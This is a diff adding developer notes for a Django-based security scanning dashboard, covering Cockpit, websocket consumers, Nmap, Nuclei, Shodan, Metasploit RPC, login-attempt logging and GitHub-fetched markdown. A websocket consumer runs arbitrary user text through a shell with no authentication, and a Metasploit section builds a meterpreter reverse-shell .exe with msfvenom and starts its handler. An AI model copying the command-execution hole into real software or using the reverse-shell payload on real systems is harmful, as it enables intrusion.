@@ -266,3 +266,488 @@ def user_login(request):
         return render(request, 'accounts/auth-signin.html', status=401)
 ```
 
+# Cockpit
+- Installation
+```bash
+apt install cockpit
+systemctl start cockpit        # Access to web from https://<server-ip>:9090
+```
+
+- Add these lines to `/usr/lib/systemd/system/cockpit.service`
+```bash
+[Install]
+WantedBy=multi-user.target
+Alias=cockpit.socket
+```
+
+- Enable the service
+```bash
+systemctl daemon-reload
+systemctl enable cockpit
+```
+
+# Free RAM
+```bash
+systemctl disable apt-daily.timer
+```
+
+# Django Channels
+- Dependencies
+```bash
+pip install channels gunicorn uvicorn
+```
+
+- `core` > `settings.py`
+```python
+INSTALLED_APPS = [
+    ...
+    'channels',
+]
+
+ASGI_APPLICATION = 'core.asgi.application'
+CHANNEL_LAYERS = {
+    'default': {
+        'BACKEND': 'channels.layers.InMemoryChannelLayer',  # or use 'channels.layers.RedisChannelLayer'
+    },
+}
+```
+
+- `core` > `asgi.py`
+```python
+import os
+from django.core.asgi import get_asgi_application
+from channels.routing import ProtocolTypeRouter, URLRouter
+from channels.auth import AuthMiddlewareStack
+from apps.network.routing import websocket_urlpatterns
+
+os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'core.settings')
+
+application = ProtocolTypeRouter({
+    'http': get_asgi_application(),
+    'websocket': AuthMiddlewareStack(
+        URLRouter(
+            websocket_urlpatterns
+        )
+    ),
+})
+```
+
+- `apps` > `network` > `consumers.py`
+```python
+import subprocess
+from channels.generic.websocket import AsyncWebsocketConsumer
+
+class CommandConsumer(AsyncWebsocketConsumer):
+    async def connect(self):
+        await self.accept()
+
+    async def receive(self, text_data=None, bytes_data=None):
+        command = text_data
+        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output, error = process.communicate()
+
+        if error:
+          await self.send(text_data=f"Error: {error.decode('utf-8')}")
+        else:
+          await self.send(text_data=output.decode('utf-8'))
+
+    async def disconnect(self, close_code):
+        pass
+```
+
+```python
+class NetNameReverseLookupConsumer(AsyncWebsocketConsumer):
+    async def connect(self):
+        await self.accept()
+
+    async def receive(self, text_data=None, bytes_data=None):
+        ip_list = []
+        for ip in ipaddress.IPv4Network(text_data):
+            ip_list.append(str(ip))
+
+        with ThreadPoolExecutor() as executor:
+            results = executor.map(self.process_ip, ip_list)
+            for result in results:
+                await self.send(text_data=result)
+
+    def process_ip(self, ip):
+        cmd = ["docker", "run", "--rm", "zeitgeist/docker-whois", ip]
+        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output, error = process.communicate()
+        if output:
+            match = re.search(r"(?i)netname:\s+(.*)", output.decode("utf-8"))
+            return f"{ip} > {match.group(1)}\n"
+        return ""          
+
+    async def disconnect(self, close_code):
+        pass
+```
+
+- `apps` > `network` > `routing.py`
+```python
+from django.urls import re_path
+from . import consumers
+
+websocket_urlpatterns = [
+    re_path(r'ws/command/$', consumers.CommandConsumer.as_asgi()),
+]
+```
+
+- `apps` > `templates` > `network` > `scanner.html`
+```html
+<h1>Command Execution</h1>
+<input type="text" id="command" placeholder="Enter command">
+<button onclick="sendCommand()">Execute</button>
+<div id="output"></div>
+
+<script>
+  var socket = new WebSocket('ws://' + window.location.host + '/ws/command/');
+
+  socket.onmessage = function(event) {
+      var output = document.getElementById('output');
+      output.innerHTML += event.data + '<br>';
+  };
+
+  function sendCommand() {
+      var input = document.getElementById('command');
+      socket.send(input.value);
+      input.value = '';
+  }
+</script>
+```
+
+- Nginx
+```bash
+location /ws/ {
+    proxy_pass http://webapp;
+    proxy_http_version 1.1;
+    proxy_set_header Upgrade $http_upgrade;
+    proxy_set_header Connection "Upgrade";
+}
+```
+
+- Run
+```bash
+gunicorn core.asgi:application -w 1 -k uvicorn.workers.UvicornWorker --bind 0.0.0.0:5005
+```
+
+
+# Nmap
+- Create a Dockerfile in ```dockers``` > ```nmap```
+```bash
+FROM alpine:latest
+
+RUN apk update && \
+    apk add nmap && \
+    apk add nmap-scripts
+```
+
+- Create docker image by running this command in ```dockers``` > ```nmap```
+```bash
+docker build -t nmap .
+```
+
+- `consumers.py`
+```python
+import subprocess
+from channels.generic.websocket import AsyncWebsocketConsumer
+import subprocess
+
+class CommandConsumer(AsyncWebsocketConsumer):
+    async def connect(self):
+        await self.accept()
+
+    async def receive(self, text_data=None, bytes_data=None):
+        target = text_data
+        # cmd = ['docker', 'run', '--rm', '-it', 'nmap', 'nmap', '-sV', '-p', '443', '--script=banner', target]
+        cmd = ['docker', 'run', '--rm', '-it', 'nmap', 'nmap', '-p', '443', target]
+        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output, error = process.communicate()
+        print (error.decode('utf-8'))
+        await self.send(text_data=(
+            output.decode('utf-8') +
+            '<br>-----------------------------------<br>' +
+            'ERROR<br>-----------------------------------<br>' +
+            error.decode('utf-8')
+        ))
+
+    async def disconnect(self, close_code):
+        pass
+```
+
+# Shodan API
+- Install library
+```bash
+pip install shodan
+```
+
+- `views.py`
+```python
+def shodan(request):
+    api = Shodan('xxxxxxxxxxxxxxxx')
+    ipinfo = api.host('8.8.8.8')
+
+    context = {
+        'ipinfo': ipinfo,
+    }
+    return render(request, "api/shodan.html", context)
+```
+
+# Nuclei Docker
+- Pull image
+```bash
+docker pull projectdiscovery/nuclei
+```
+
+- Download template from https://github.com/projectdiscovery/nuclei-templates and put them in `/root/nuclei-templates`
+
+- Get list of templates and put them into `/opt/ZORBA/apps/static/nuclei-templates.txt`
+```bash
+docker run --rm -it projectdiscovery/nuclei -tl
+```
+
+- Run
+```bash
+docker run -it -v ~/nuclei-templates:/templates projectdiscovery/nuclei -t /templates -u https://scanme.nmap.org
+```
+
+# Metasploit RPC
+- Get docker image
+```bash
+docker pull metasploitframework/metasploit-framework
+```
+
+- Run Docker and enable RPC on port 4444
+```bash
+docker run -it --rm -p 4444:4444 -p 55553:55553 metasploitframework/metasploit-framework /bin/bash -c "./msfconsole -q -x 'load msgrpc ServerHost=0.0.0.0 ServerPort=55553 User=msf Pass=abc123'"
+```
+
+- Manual commands  (No Need !)
+```bash
+# Run Exploit in one line with Docker
+docker run -it --rm -p 4444:4444 metasploitframework/metasploit-framework /bin/bash -c "./msfconsole -qx 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 191.167.1.240; set LPORT 4444; exploit'"
+
+# Create maliciuos .exe with msfvenom
+docker run --rm -it -v /opt/payload:/home/msf metasploitframework/metasploit-framework /bin/bash
+bash-5.1$ ./msfvenom -p windows/meterpreter/reverse_tcp LHOST=191.167.1.240 LPORT=4444 -f exe -o /home/msf/reverse_shell.exe
+```
+
+# Login attempt
+- Install package
+```bash
+pip install django-axes
+```
+
+- `settings.py`
+```python
+INSTALLED_APPS = [
+    **
+    'axes',
+]
+
+MIDDLEWARE = [
+    **
+    'axes.middleware.AxesMiddleware',
+]
+
+AUTHENTICATION_BACKENDS = [
+    'django.contrib.auth.backends.ModelBackend',
+    'axes.backends.AxesStandaloneBackend',
+]
+
+AXES_ENABLE_SUCCESS = True
+AXES_ENABLE_REGISTRATION = False
+AXES_LOCK_OUT_AT_FAILURE = True
+AXES_COOLOFF_TIME = 1
+AXES_FAILURE_LIMIT = 10
+```
+
+- Migrate
+```bash
+python manage.py migrate
+```
+
+- `apps` > `authentication` > `urls.py`
+```python
+from .views import login_attempts
+
+urlpatterns = [
+    *
+    path('login-attempts/', login_attempts, name='login_attempts'),
+]
+```
+
+- `apps` > `authentication` > `views.py`
+```python
+from django.contrib.auth.models import User
+from axes.models import AccessLog, AccessAttempt
+from django.shortcuts import render
+
+def login_view(request):
+    *
+            user = authenticate(request=request, username=username, password=password)   # add request=request to arguments
+    *
+
+def login_attempts(request):
+    access_logs = AccessLog.objects.filter(username__isnull=False).order_by('-attempt_time')[:10]
+    failed_attempts = AccessAttempt.objects.filter(attempt_time__isnull=False, failures_since_start__gt=0).order_by('-attempt_time')[:10]
+    login_attempts = []
+    for log in access_logs:
+        user = User.objects.get(username=log.username)
+        login_attempts.append({
+            'username': log.username,
+            'time': log.attempt_time,
+            'date': log.attempt_time.date(),
+            'user_fullname': user.get_full_name(),
+            'success': True,
+        })
+    for attempt in failed_attempts:
+        login_attempts.append({
+            'username': attempt.username,
+            'time': attempt.attempt_time,
+            'date': attempt.attempt_time.date(),
+            'user_fullname': '',
+            'success': False,
+        })
+    login_attempts = sorted(login_attempts, key=lambda x: x['time'], reverse=True)[:10]
+    return render(request, 'accounts/login_attempts.html', {'login_attempts': login_attempts})
+```
+
+- `apps` > `templates` > `accounts` > `login_attempts.html`
+```html
+<div class="body flex-grow-1 px-3">
+  <div class="container-lg">
+    <div class="card mb-4">
+      <h6 class="card-header">Last 20 Login Attempts</h6>
+      <div class="card-body">
+        <table class="table table-striped">
+          <thead>
+            <tr>
+              <th>Username</th>
+              <th>Time</th>
+              <th>Date</th>
+              <th>Status</th>
+            </tr>
+          </thead>
+          <tbody>
+            {% for attempt in login_attempts %}
+                <tr>
+                    <td>{{ attempt.username }}</td>
+                    <td>{{ attempt.time }}</td>
+                    <td>{{ attempt.date }}</td>
+                    <td class="{% if attempt.success %}text-success{% else %}text-danger{% endif %}">
+                      {% if attempt.success %}
+                          <span class="badge me-1 rounded-pill bg-success">Success</span>
+                      {% else %}
+                          <span class="badge me-1 rounded-pill bg-danger">Failure</span>
+                      {% endif %}
+                    </td>
+                </tr>
+            {% endfor %}
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+</div>
+```
+
+# Show Github md files in Methodology
+- Get Token with `Read Content` permission and Access to Class Repository from https://github.com/settings/tokens?type=beta
+
+- Install packages
+```bash
+pip install markdown2
+```
+  
+- `views.py`
+```python
+import requests
+import base64
+import markdown2
+
+def xss(request):
+    access_token = 'github_pat_11APOZ4FA0V8xxxxxxxxxxxxxxxxxxxxxxx'
+
+    owner = 'target-hunter'
+    repo = 'Class'
+    path = 'OWASP/01-Network.md'
+
+    url = f'https://api.github.com/repos/{owner}/{repo}/contents/{path}'
+    headers = {'Authorization': f'token {access_token}'}
+    response = requests.get(url, headers=headers)
+
+    content = response.json()['content']
+    decoded_content = base64.b64decode(content).decode('utf-8')
+  
+    html_content = markdown2.markdown(decoded_content)
+    context = {
+        'html_content': html_content,
+    }
+    return render(request, "owasp/xss.html", context) 
+```
+
+# Selenium
+- Get and run docker image
+```bash
+docker pull selenium/standalone-chrome
+docker run -d -p 4444:4444 --shm-size="2g" selenium/standalone-chrome
+```
+
+- Install library
+```bash
+pip uninstall selenium
+```
+
+- Python code
+```python
+from selenium import webdriver
+
+options = webdriver.ChromeOptions()
+options.add_argument('--headless')
+
+driver = webdriver.Remote(
+    command_executor='http://localhost:4444',
+    options=options
+)
+
+driver.get('https://www.google.com')
+driver.save_screenshot('screenshot.png')
+
+driver.quit()
+```
+
+# Gunicorn timeout
+```bash
+gunicorn core.asgi:application --timeout 200 -w 1 -k uvicorn.workers.UvicornWorker --bind 0.0.0.0:5005
+```
+
+# Fetch from Github
+```python
+from django.shortcuts import render, redirect
+from django.urls import reverse
+import re
+import requests
+import base64
+import mistune
+
+def sqli(request):
+    access_token = 'github_pat_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
+
+    owner = 'xxx'
+    repo = 'checklist'
+    path = 'sqli.md'
+
+    url = f'https://api.github.com/repos/{owner}/{repo}/contents/{path}'
+    headers = {'Authorization': f'token {access_token}'}
+    response = requests.get(url, headers=headers)
+
+    content = response.json()['content']
+    decoded_content = base64.b64decode(content).decode('utf-8')
+  
+    html_content = mistune.markdown(decoded_content)
+    context = {
+        'html_content': html_content,
+    }
+    return render(request, "checklist/sqli.html", context)
+```
